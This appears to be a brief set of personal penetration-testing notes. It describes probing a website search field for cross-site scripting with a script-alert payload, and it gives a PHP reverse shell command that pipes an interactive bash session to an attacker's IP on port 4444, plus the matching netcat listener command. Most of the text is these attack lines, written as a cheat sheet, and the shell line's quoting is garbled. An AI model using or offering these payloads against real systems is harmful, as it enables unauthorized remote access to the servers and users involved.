help section of website  
search field  
“xxx” if returns "'xxx' not found, may be vulnerable to xxs  
search field  
```html
<script>alert('hacked')</script> to test XXS vuln  
```
  
PHP reverse shell  
exec("/bin/bash -c 'bash -i >& /dev/tcp/’attacking ip'/4444 0>&1'");  
Run nc -lvp 4444